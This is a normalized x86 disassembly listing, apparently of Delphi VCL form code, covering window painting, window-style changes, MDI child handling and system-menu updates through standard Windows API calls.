je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_497e0c
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xb0 ]
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x27c ] edx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_497ed4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x278 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4930c8
retn
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_497e0c
sub_479744
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_42e718
cmp [ ebx + 0x2a8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x2a8 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_479784
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x112
jg r-xdata
add edx 0xfffffce2
sub edx 0x2
jb r-xdata
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_47ea9c
jmp r-xdata
sub edx 0xacfa
je r-xdata
mov eax [ ebx + 0x4 ]
and eax 0xfff0
cmp eax 0xf120
je r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4936a0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
and eax 0xfff0
cmp eax 0xf030
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_4483f8
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
sub edx 0x2c
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xcf ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_4483f8
jmp r-xdata
mov esi [ ebx + 0x4 ]
xor edi edi
jmp r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
call sub_496868
push eax
call IsIconic
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebp - 0x11 ] al
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4936a0
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2a0 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
sub edx 0x1a
je r-xdata
test esi esi
je r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_483e40
jmp r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x287 ] 0x2
jne r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a0 ]
xor ecx ecx
call sub_4675ec
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2a0 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
and ax [ r-xdata ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
jmp r-xdata
test edi edi
je r-xdata
test edi edi
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_48f2b0
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_48f2b0
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_48f2b0
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_48f2b0
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_48f2b0
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_48f2b0
push 0x0
xor ecx ecx
mov edx 0xb050
mov eax [ ebp - 0x4 ]
call sub_48f2b0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_47a6e8
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_46e0ac
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_479b53
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_479b36
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x18 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_46e950
mov eax [ rw-data ]
mov edx [ eax + 0x80 ]
mov eax [ ebp - 0xc ]
call sub_46e7e4
mov eax [ ebp - 0x18 ]
movzx eax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x18 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_468e8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479b3d
xor edx edx
mov eax [ ebp - 0xc ]
call sub_46e950
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a0 ]
xor ecx ecx
call sub_4675ec
mov edi eax
test edi edi
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x288 ]
dec edx
sub dl 0x2
jae r-xdata
mov dl 0x1
mov eax edi
call sub_477028
mov esi eax
mov eax [ ebp - 0x4 ]
cmp edi [ eax + 0x278 ]
jne r-xdata
mov eax esi
call sub_48a70c
mov edi eax
push esi
call GetParent
mov esi eax
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_47a6e8
call sub_496868
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_479c81
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_46e0ac
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_479c5a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_479c3d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_46e950
mov eax [ rw-data ]
mov edx [ eax + 0x80 ]
mov eax [ ebp - 0xc ]
call sub_46e7e4
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479c44
xor edx edx
mov eax [ ebp - 0xc ]
call sub_46e950
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x288 ]
sub dl 0x1
je r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x283 ] 0x2
je r-xdata
test esi esi
je r-xdata
mov eax [ rw-data ]
cmp edi [ eax + 0x5c ]
je r-xdata
push esi
call SetFocus
jmp r-xdata
call sub_496868
mov esi eax
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x281 ]
sub dl 0x2
je r-xdata
sub dl 0x2
jne r-xdata
mov edx eax
or [ edx + 0x18 ] 0x2
cmp esi [ ebp - 0x4 ]
je r-xdata
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub dl 0x3
jne r-xdata
mov eax [ esi + 0x278 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp esi [ eax + 0x60 ]
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xfc ]
jmp r-xdata
cmp edi eax
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x8
call sub_48f2b0
sub_479c61
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_496868
push eax
call ReleaseDC
retn
sub_479d2c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x36c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2c8 ]
push eax
call CallWindowProcW
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_479d78
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_47a71c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_47a768
cmp [ eax + 0x283 ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_479db8
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_479f89
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x36c ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1b8 ]
call sub_46df70
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x287 ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_493d14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x36c ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_48dac0
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_48c490
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x36c ] 0x0
je r-xdata
push ebp
call sub_479d2c
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x287 ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x36c ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x36c ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1b8 ]
call sub_46df70
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_47a71c
test eax eax
je r-xdata
push ebp
call sub_479d2c
pop ecx
push ebp
call sub_479d2c
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_479d78
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x36c ]
call sub_4769e4
jmp r-xdata
sub_479f9c
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_477d48
mov eax [ ebx + 0x36c ]
test eax eax
je r-xdata
test [ ebx + 0x55 ] 0x80
je r-xdata
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x287 ] 0x2
jne r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
push esp
mov eax [ ebx + 0x36c ]
push eax
call GetClientRect
test eax eax
je r-xdata
mov eax ebx
call sub_48d8bc
mov edx [ ebx + 0x364 ]
sub eax [ edx + 0x18 ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax ebx
call sub_48d878
mov ecx eax
mov eax [ ebx + 0x364 ]
sub ecx [ eax + 0x14 ]
mov esi [ ebx + 0x364 ]
mov edx [ esi + 0x10 ]
mov eax [ esi + 0xc ]
call sub_432a2c
lea edx [ esp + 0x10 ]
mov eax ebx
call sub_47ecf0
push 0xffffffff
push 0x0
mov eax [ ebx + 0x36c ]
push eax
call InvalidateRect
sub_47a058
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_478408
mov eax ebx
call sub_496c14
test al al
je r-xdata
mov eax ebx
call sub_42e8d0
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_496868
push eax
call GetWindowLongW
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_492658
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_496868
push eax
call SetWindowLongW
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_42e8a4
call sub_46849c
mov edx esi
mov eax ebx
call sub_42e8a4
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
sub_47a0f0
push ebp
mov ebp esp
push ecx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29c ] 0x0
jne r-xdata
pop esi
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x29c ] 0x1
xor eax eax
push ebp
push sub_47a170
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x29c ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
jne r-xdata
movzx edx [ esi + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ rw-data ]
movzx edx [ eax + 0x31 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_47a17c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
call sub_48a70c
test eax eax
je r-xdata
mov eax [ ebx + 0x344 ]
call sub_44af28
mov edi eax
lea eax [ edi + 0x1 ]
push eax
lea eax [ ebx + 0x344 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_44b0f0
add esp 0x4
mov eax [ ebx + 0x344 ]
mov edx [ esi + 0x4 ]
mov edx [ edx ]
mov [ eax + edi * 8 ] edx
mov eax [ ebx + 0x344 ]
mov edx [ esi + 0x8 ]
mov [ eax + edi * 8 + 0x4 ] edx
mov eax [ esi + 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_47a1e4
push ebx
push esi
push edi
push ebp
push ecx
mov ebp ecx
mov edi edx
mov esi eax
and [ edi ] 0xfff4ffff
and [ ebp ] 0xfffffbff
movzx eax [ esi + 0x281 ]
mov [ esp ] al
cmp [ esi + 0x287 ] 0x1
jne r-xdata
movzx ebx [ esi + 0x280 ]
movzx eax [ esp ]
sub al 0x1
jb r-xdata
movzx eax [ esp ]
test al al
je r-xdata
movzx ebx [ r-xdata ]
jmp r-xdata
sub al 0x2
je r-xdata
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
movzx eax [ esp ]
sub al 0x3
jae r-xdata
movzx eax [ r-xdata ]
and al bl
mov ebx eax
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
test bl 0x1
je r-xdata
cmp [ esi + 0x287 ] 0x1
jne r-xdata
movzx eax [ r-xdata ]
and al bl
mov ebx eax
jmp r-xdata
test bl 0x8
je r-xdata
or [ edi ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
or [ ebp ] 0x400
test bl 0x4
je r-xdata
or [ edi ] 0x20000
or [ edi ] 0x10000
sub_47a2ad
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff4
mov [ esp ] dl
mov ebx eax
movzx eax [ esp ]
cmp al [ ebx + 0x280 ]
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
movzx eax [ esp ]
mov [ ebx + 0x280 ] al
mov eax ebx
call sub_496c14
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x287 ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_496868
push eax
call GetWindowLongW
mov [ esp + 0x4 ] eax
push 0xffffffec
mov eax ebx
call sub_496868
push eax
call GetWindowLongW
mov [ esp + 0x8 ] eax
lea ecx [ esp + 0x8 ]
lea edx [ esp + 0x4 ]
mov eax ebx
mov si 0xffaa
call sub_4483f8
mov eax [ esp + 0x4 ]
push eax
push 0xfffffff0
mov eax ebx
call sub_496868
push eax
call SetWindowLongW
mov eax [ esp + 0x8 ]
push eax
push 0xffffffec
mov eax ebx
call sub_496868
push eax
call SetWindowLongW
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_496868
push eax
call SetWindowPos
jmp r-xdata
cmp [ ebx + 0x283 ] 0x2
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_492ec4
sub_47a398
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
mov esi eax
and [ edx ] 0x7f3bff7f
and [ edi ] 0xfffffe7e
mov eax [ ebp + 0x8 ]
and [ eax ] 0xffffd7ff
movzx eax [ esi + 0x281 ]
cmp [ esi + 0x287 ] 0x1
jne r-xdata
movzx ecx al
cmp ecx 0x5
ja r-xdata
mov ecx eax
test cl cl
je r-xdata
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ ecx * 4 + jump_table_47a3e6 ]
mov al 0x2
sub cl 0x3
jne r-xdata
pop edi
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x287 ] 0x1
je r-xdata
cmp [ esi + 0x30 ] 0x0
jne r-xdata
or [ edx ] 0xc00000
jmp r-xdata
or [ edx ] 0xc40000
jmp r-xdata
test [ esi + 0x1c ] 0x10
je r-xdata
or [ edi ] 0x80
cmp [ esi + 0x1cc ] 0x0
jne r-xdata
mov ecx [ edx ]
or ecx 0x80000000
or ecx 0xc00000
mov [ edx ] ecx
cmp [ esi + 0x30 ] 0x0
je r-xdata
or [ edx ] 0x80000000
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx ]
or edx 0x8
or edx 0x800
or edx 0x2000
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
mov ecx [ edx ]
or ecx __dos_header
or ecx 0x80
mov [ edx ] ecx
or [ edx ] 0xc00000
jmp r-xdata
mov ecx [ edi ]
or ecx 0x1
or ecx 0x100
mov [ edi ] ecx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
jne r-xdata
sub_47a4ac
push esi
push edi
add esp 0xfffffff4
mov edi eax
cmp dl [ edi + 0x281 ]
je r-xdata
add esp 0xc
pop edi
pop esi
retn
mov [ edi + 0x281 ] dl
cmp [ edi + 0x268 ] 0x0
je r-xdata
xor edx edx
jmp r-xdata
movzx eax [ edi + 0x281 ]
sub al 0x2
je r-xdata
mov eax edi
call sub_477ec4
mov eax edi
call sub_496c14
test al al
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
push 0xfffffff0
mov eax edi
call sub_496868
push eax
call GetWindowLongW
mov [ esp ] eax
push 0xffffffec
mov eax edi
call sub_496868
push eax
call GetWindowLongW
mov [ esp + 0x4 ] eax
push 0xffffffe6
mov eax edi
call sub_496868
push eax
call GetClassLongW
mov [ esp + 0x8 ] eax
lea eax [ esp + 0x8 ]
push eax
lea ecx [ esp + 0x8 ]
lea edx [ esp + 0x4 ]
mov eax edi
mov si 0xffa9
call sub_4483f8
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax edi
mov si 0xffaa
call sub_4483f8
mov eax [ esp ]
push eax
push 0xfffffff0
mov eax edi
call sub_496868
push eax
call SetWindowLongW
mov eax [ esp + 0x4 ]
push eax
push 0xffffffec
mov eax edi
call sub_496868
push eax
call SetWindowLongW
mov eax [ esp + 0x8 ]
push eax
push 0xffffffe6
mov eax edi
call sub_496868
push eax
call SetClassLongW
mov eax edi
call sub_496c14
test al al
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax edi
call sub_496868
push eax
call SetWindowPos
mov eax edi
mov edx [ eax ]
call [ edx + 0x80 ]
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
push 0xffffffff
mov eax edi
call sub_496868
push eax
call GetSystemMenu
push 0x0
xor ecx ecx
mov edx 0x81
mov eax edi
call sub_48f2b0
cmp [ edi + 0x281 ] 0x3
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax edi
call sub_496868
push eax
call SendMessageW
mov eax edi
call sub_47c548
push eax
push 0x1
push 0x80
mov eax edi
call sub_496868
push eax
call SendMessageW
jmp r-xdata
sub_47a64c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0x90 ]
mov ecx esp
mov eax ebx
call sub_48d660
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0x90 ]
je r-xdata
mov eax ebx
call sub_492ec4
sub_47a690
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x90 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_48d78c
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
movzx eax [ ebx + 0x281 ]
mov [ ebx + 0x2d0 ] al
mov [ ebx + 0x281 ] 0x0
movzx eax [ ebx + 0x2d0 ]
mov [ ebx + 0x281 ] al
jmp r-xdata
sub_47a6e8
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x287 ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x36c ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x36c ]
push eax
call SendMessageW
call sub_48a70c
sub_47a71c
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x287 ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x36c ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_47f684
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_47f670
cmp [ eax + 0x287 ] 0x1
jne r-xdata
sub_47a768
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x287 ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x36c ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_47f684
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_47f670
cmp [ eax + 0x287 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_47a7b8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_424590
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_47a7e8
push ebx
push esi
push edi
push ebp
mov ebx eax
xor ebp ebp
push 0x2
mov eax ebx
call sub_496868
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ rw-data ]
call sub_47f654
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_480674
mov eax [ rw-data ]
call sub_47f654
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_47f640
mov ebp eax
jmp r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_47f640
mov ebp eax
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_47f640
cmp edi [ eax + 0x4 ]
jne r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_47f640
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_47a8a4
push ebx
mov ebx eax
mov eax ebx
call sub_47a89c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x298 ]
call sub_4730f4
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_47a8cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x287 ]
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
test bl bl
jne r-xdata
cmp bl 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x287 ] 0x3
je r-xdata
cmp bl 0x1
jne r-xdata
